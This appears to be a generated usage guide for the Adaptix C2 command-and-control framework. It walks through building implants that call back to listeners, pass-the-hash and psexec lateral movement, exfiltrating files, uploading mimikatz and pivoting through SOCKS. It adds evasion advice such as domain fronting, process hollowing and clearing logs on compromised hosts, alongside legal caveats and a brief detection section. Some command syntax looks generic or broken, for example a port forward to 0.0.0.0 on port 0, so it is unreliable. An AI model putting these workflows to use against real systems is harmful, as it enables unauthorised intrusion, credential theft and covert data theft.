---
tool_name: "adaptix-c2"
display_name: "Adaptix C2"
mitre_tactic: "command_and_control"
mitre_tactic_id: "TA0011"
mitre_subcategory: "c2_frameworks"
install_command: "sudo apt install adaptix-c2"
github_repo: "https://github.com/EmperorPenguin0/Adaptix-C2"
kali_tools_page: "https://www.kali.org/tools/adaptix-c2/"
difficulty_level: "advanced"
requires_root: true
gui_available: false
tags: ["c2", "command-and-control", "post-exploitation", "red-team", "implant", "beacon"]
related_tools: ["havoc", "metasploit-framework", "powershell-empire"]
---

# Adaptix C2

## Chapter 1: Introduction & Overview

### What is Adaptix C2?
Adaptix C2 is a modern, open-source command-and-control (C2) framework designed for red team operations and penetration testing. It provides a lightweight, modular architecture for managing implants, executing post-exploitation tasks, and maintaining persistent access to compromised hosts across Windows, Linux, and macOS environments.

### History & Background
- **Created:** 2023 by EmperorPenguin0
- **Maintained:** Active open-source project
- **License:** Open-source (GitHub repository)
- **Purpose:** Red team command-and-control, adversary emulation, post-exploitation

Adaptix C2 was developed as a flexible alternative to existing C2 frameworks, emphasizing modularity, operator control, and clean architecture for custom post-exploitation workflows.

### When to Use This Tool
- **Red team engagements:** Full-spectrum adversary emulation requiring persistent C2 channels
- **Penetration testing:** Managing multiple compromised hosts from a centralized server
- **Post-exploitation:** Executing commands, privilege escalation, lateral movement
- **Custom workflows:** Building tailored implant behaviors and communication protocols

### When NOT to Use This Tool
- Without explicit written authorization from the target organization
- On production systems without a defined scope and rules of engagement
- For any unauthorized access or malicious activity

### Legal and Ethical Considerations
- **Always obtain written permission** before deploying C2 infrastructure against any target
- **Understand the scope** - know exactly what systems you are authorized to access
- **Document all activity** - maintain logs of commands executed and access obtained
- **Use encryption** - protect C2 communications from interception by unauthorized parties
- **Clean up** - remove all implants, listeners, and artifacts after engagement completion

### Key Concepts
- **Implant:** A payload deployed on a target host that communicates back to the C2 server
- **Listener:** A server-side component that accepts incoming connections from implants
- **Beacon:** An implant that checks in at intervals rather than maintaining a persistent connection
- **Stager:** A small initial payload used to download and execute a larger implant
- **Teamserver:** Centralized server that coordinates multiple operators and sessions

---

## Chapter 2: Installation & Setup

### System Requirements
- **Minimum RAM:** 1 GB (2 GB recommended for teamserver)
- **Disk Space:** 200 MB for base install
- **Network:** Reliable network interface for C2 traffic
- **Privileges:** Root required for server operations

### Installation Methods

#### Method 1: APT (Recommended)
```bash
sudo apt update
sudo apt install adaptix-c2
```

#### Method 2: From Source
```bash
git clone https://github.com/EmperorPenguin0/Adaptix-C2.git
cd Adaptix-C2
# Follow project-specific build instructions
```

### Initial Configuration
After installation, verify the tool is available:
```bash
adaptix-c2 --help
```

### Dependencies
- Network connectivity for C2 communications
- A working knowledge of C2 operations and OPSEC

---

## Chapter 3: Core Concepts

### Architecture Overview
Adaptix C2 follows a modular client-server architecture:
- **Teamserver:** Central coordination point for operators and implants
- **Client:** Operator interface for managing sessions and executing commands
- **Implant/Agent:** Payload running on target hosts that communicates with the teamserver
- **Listeners:** Server-side endpoints that handle implant communication

### Communication Flow
```
Operator -> Client -> Teamserver -> Listener -> Implant (Target)
```

### Session Management
- Sessions represent active connections between the teamserver and deployed implants
- Each session has a unique identifier and associated metadata (target OS, IP, user context)
- Sessions can be backgrounded, restored, or terminated

### OPSEC Considerations
- Use encrypted communications (HTTPS, custom protocols)
- Implement sleep jitter to avoid beacon detection
- Route traffic through legitimate-looking domains
- Use process injection and fileless techniques on targets
- Monitor for EDR/AV detection and adapt accordingly

---

## Chapter 4: Basic Usage

### Starting the Teamserver
```bash
# Start the Adaptix C2 teamserver
adaptix-c2 server --host 0.0.0.0 --port 7777 --password MySecurePassword
```

### Connecting as a Client
```bash
# Connect to the teamserver
adaptix-c2 client --host <teamserver_ip> --port 7777 --password MySecurePassword
```

### Generating an Implant
```bash
# Generate a Windows implant
adaptix-c2 generate --type exe --platform windows --arch amd64 --listener http://<your_ip>:8080 --output implant.exe

# Generate shellcode
adaptix-c2 generate --type shellcode --platform windows --arch amd64 --listener http://<your_ip>:8080 --output implant.bin

# Generate a DLL
adaptix-c2 generate --type dll --platform windows --arch amd64 --listener http://<your_ip>:8080 --output implant.dll
```

### Setting Up a Listener
```bash
# Create an HTTP listener
adaptix-c2 listener add --type http --host <your_ip> --port 8080 --name http_listener

# Create an HTTPS listener with SSL
adaptix-c2 listener add --type https --host <your_ip> --port 443 --cert /path/to/cert.pem --key /path/to/key.pem --name https_listener
```

### Managing Sessions
```bash
# List active sessions
adaptix-c2 sessions

# Interact with a session
adaptix-c2 session --id <session_id>

# Kill a session
adaptix-c2 session --id <session_id> --kill
```

---

## Chapter 5: Advanced Usage

### Lateral Movement
```bash
# Use a session to pivot to other hosts
adaptix-c2 session --id <session_id> --lateral-move --target <target_ip> --method psexec

# Pass-the-hash
adaptix-c2 session --id <session_id> --lateral-move --target <target_ip> --method pth --hash <ntlm_hash>
```

### Privilege Escalation
```bash
# Use built-in privesc modules
adaptix-c2 session --id <session_id> --privesc --method <method_name>

# Load a custom module
adaptix-c2 session --id <session_id> --load-module /path/to/module.ao
```

### Data Exfiltration
```bash
# Download a file from target
adaptix-c2 session --id <session_id> --download C:\Users\target\Documents\file.txt --output /loot/file.txt

# Upload a file to target
adaptix-c2 session --id <session_id> --upload /path/to/payload.exe --output C:\temp\payload.exe
```

### Pivoting and Port Forwarding
```bash
# Set up port forwarding through a session
adaptix-c2 session --id <session_id> --port-forward --local-port 8080 --remote-host <internal_host> --remote-port 80

# SOCKS proxy
adaptix-c2 session --id <session_id> --socks-proxy --local-port 1080
```

### Custom Modules
Adaptix C2 supports loading custom post-exploitation modules:
```bash
# Load a custom module into a session
adaptix-c2 session --id <session_id> --load-module /path/to/custom_module.ao
```

---

## Chapter 6: Integration & Automation

### REST API
Adaptix C2 exposes a REST API for automation:
```bash
# Authenticate
curl -X POST https://<teamserver>:7777/api/login -d '{"username":"admin","password":"MySecurePassword"}'

# List sessions
curl -H "Authorization: Bearer <token>" https://<teamserver>:7777/api/sessions

# Execute command via API
curl -X POST -H "Authorization: Bearer <token>" https://<teamserver>:7777/api/session/<id>/execute -d '{"command":"whoami"}'
```

### Scripting and Automation
```bash
# Run a resource file
adaptix-c2 client --resource /path/to/commands.txt

# Execute commands programmatically
adaptix-c2 exec --host <teamserver> --port 7777 --password <pass> --command "sessions"
```

### Integration with Other Tools
- **Metasploit:** Use Metasploit payloads for initial access, then hand off to Adaptix C2
- **Cobalt Strike alternatives:** Use Adaptix C2 as a lightweight alternative for team operations
- **OSINT tools:** Integrate recon data to drive targeting decisions

---

## Chapter 7: OPSEC & Defense Evasion

### Evasion Techniques
- **Sleep obfuscation:** Randomize beacon intervals to avoid pattern detection
- **Domain fronting:** Route C2 traffic through legitimate CDN domains
- **Encrypted channels:** Use TLS for all C2 communications
- **Custom user agents:** Mimic legitimate browser traffic
- **Malleable C2 profiles:** Customize request/response patterns

### Detection Avoidance
- Use legitimate-looking domains and certificates
- Minimize network artifacts (DNS, HTTP headers)
- Implement process hollowing and injection
- Clear logs and artifacts from compromised hosts
- Use in-memory execution where possible

### Recommended Best Practices
1. Always test payloads against AV/EDR before deployment
2. Use obfuscation on all payloads
3. Rotate infrastructure regularly during engagements
4. Monitor for detection and be prepared to burn infrastructure
5. Use tiered access with separate operator accounts

---

## Chapter 8: Troubleshooting & FAQ

### Common Issues

**Problem: Implant fails to connect**
- Verify the listener is running and accessible
- Check firewall rules on the teamserver
- Ensure the implant has correct callback information
- Test network connectivity from target to listener

**Problem: Session drops repeatedly**
- Increase sleep interval
- Check network stability
- Verify the implant process is not being killed by AV/EDR

**Problem: Commands return no output**
- Check the session is still active
- Verify the command is valid for the target OS
- Look for encoding issues in output

**Problem: Lateral movement fails**
- Ensure you have valid credentials or hashes
- Verify network connectivity to the target
- Check that required services are running on the target

### Debug Mode
```bash
adaptix-c2 server --host 0.0.0.0 --port 7777 --password MySecurePassword --debug
```

### Logs
- Server logs: Check the teamserver output for connection and error messages
- Client logs: Review client-side output for command execution results

---

## Chapter 9: Real-World Scenarios

### Red Team Engagement Workflow

```bash
# 1. Start teamserver
adaptix-c2 server --host 0.0.0.0 --port 7777 --password MySecurePassword

# 2. Connect as operator
adaptix-c2 client --host teamserver_ip --port 7777 --password MySecurePassword

# 3. Create HTTPS listener
adaptix-c2 listener add --type https --host redirector.example.com --port 443 \
  --cert /path/to/cert.pem --key /path/to/key.pem --name https_listener

# 4. Generate implant
adaptix-c2 generate --type shellcode --platform windows --arch amd64 \
  --listener https://redirector.example.com:443 --output implant.bin

# 5. Deploy implant via initial access (phishing, exploit, etc.)

# 6. Once agent connects, enumerate
adaptix-c2 session --id <session_id>
adaptix-c2 session --id <session_id> --execute "whoami /all"
adaptix-c2 session --id <session_id> --execute "systeminfo"

# 7. Lateral movement
adaptix-c2 session --id <session_id> --lateral-move \
  --target 10.0.0.50 --method psexec --username admin --password P@ssw0rd
```

### Multi-Hop Pivoting

```bash
# 1. After compromising first host
adaptix-c2 session --id <session_id> --port-forward \
  --local-port 1080 --remote-host 0.0.0.0 --remote-port 0

# 2. Use SOCKS proxy
adaptix-c2 session --id <session_id> --socks-proxy --local-port 1080

# 3. Configure proxychains
# /etc/proxychains4.conf:
# socks5 127.0.0.1 1080

# 4. Scan internal network
proxychains4 nmap -sT 10.0.0.0/24
```

### Data Exfiltration

```bash
# Download sensitive files
adaptix-c2 session --id <session_id> \
  --download C:\Users\target\Documents\secrets.xlsx \
  --output /loot/secrets.xlsx

# Upload tools to target
adaptix-c2 session --id <session_id> \
  --upload /tools/mimikatz.exe \
  --output C:\temp\mimikatz.exe
```

---

## Chapter 10: Command Reference

### Server Commands

| Command | Description |
|---|---|
| `server --host <ip> --port <port> --password <pass>` | Start teamserver |
| `client --host <ip> --port <port> --password <pass>` | Connect as client |

### Listener Commands

| Command | Description |
|---|---|
| `listener add --type http --host <ip> --port <port>` | Create HTTP listener |
| `listener add --type https --host <ip> --port <port> --cert <cert> --key <key>` | Create HTTPS listener |
| `listener list` | List active listeners |
| `listener remove --id <id>` | Remove a listener |

### Implant Commands

| Command | Description |
|---|---|
| `generate --type <type> --platform <os> --arch <arch> --listener <url>` | Generate implant |
| `generate --type exe` | Generate EXE implant |
| `generate --type shellcode` | Generate shellcode |
| `generate --type dll` | Generate DLL implant |

### Session Commands

| Command | Description |
|---|---|
| `sessions` | List active sessions |
| `session --id <id>` | Interact with session |
| `session --id <id> --kill` | Kill session |
| `session --id <id> --execute "<cmd>"` | Execute command |
| `session --id <id> --download <remote> --output <local>` | Download file |
| `session --id <id> --upload <local> --output <remote>` | Upload file |
| `session --id <id> --port-forward --local-port <port>` | Port forward |
| `session --id <id> --socks-proxy --local-port <port>` | SOCKS proxy |
| `session --id <id> --lateral-move --target <ip> --method <method>` | Lateral movement |

---

## Chapter 11: Detection and Defense

### Network Signatures

- HTTPS traffic to non-standard ports from non-browser processes
- Periodic HTTP(S) beaconing patterns
- Unusual process injection indicators
- TLS certificate anomalies (self-signed, short-lived)

### Host-Based Detection

```bash
# Monitor for C2 beaconing
# Look for periodic network connections
netstat -an | grep ESTABLISHED | awk '{print $5}' | cut -d: -f1 | sort | uniq -c | sort -rn

# Check for suspicious processes
ps aux | grep -i "implant\|beacon\|shell"
```

### Defense Recommendations

1. Deploy EDR with C2 detection capabilities
2. Monitor for process injection techniques
3. Implement TLS inspection for outbound traffic
4. Use network traffic analysis for beacon detection
5. Monitor for credential dumping tools

### Beacon Detection

```bash
# Analyze network traffic for beaconing patterns
# Tools: RITA, Zeek, or custom scripts
# Look for regular intervals (e.g., every 60 seconds)
# Check for consistent payload sizes
```

---

## Resources

- **GitHub Repository:** https://github.com/EmperorPenguin0/Adaptix-C2
- **Kali Tools Page:** https://www.kali.org/tools/adaptix-c2/
- **MITRE ATT&CK - Command and Control:** https://attack.mitre.org/tactics/TA0011/
- **MITRE ATT&CK - Ingress Tool Transfer:** https://attack.mitre.org/techniques/T1105/
- **MITRE ATT&CK - Remote Services:** https://attack.mitre.org/techniques/T1021/
- **Red Team Infrastructure Guide:** Various community resources on C2 infrastructure setup
- **Related Tools:** Havoc, Metasploit Framework, PowerShell Empire

---

## Appendix: Quick Reference Card

### One-Liner Commands

```bash
# Start server
adaptix-c2 server --host 0.0.0.0 --port 7777 --password MySecurePassword

# Connect client
adaptix-c2 client --host <ip> --port 7777 --password MySecurePassword

# Generate implant
adaptix-c2 generate --type exe --platform windows --arch amd64 --listener http://<ip>:8080 --output implant.exe

# Execute command
adaptix-c2 session --id <id> --execute "whoami /all"
```

### Common Post-Exploitation Commands

| Command | Description |
|---|---|
| `--execute "whoami /all"` | Current user context |
| `--execute "systeminfo"` | System information |
| `--execute "ipconfig /all"` | Network configuration |
| `--execute "net user"` | List users |
| `--execute "net localgroup administrators"` | List administrators |
| `--execute "tasklist"` | Running processes |
| `--download <remote> --output <local>` | Download file |
| `--upload <local> --output <remote>` | Upload file |

### Listener Types

| Type | Description |
|---|---|
| `http` | Standard HTTP listener |
| `https` | HTTPS with TLS encryption |
| `tcp` | Raw TCP listener |
| `dns` | DNS-based listener |
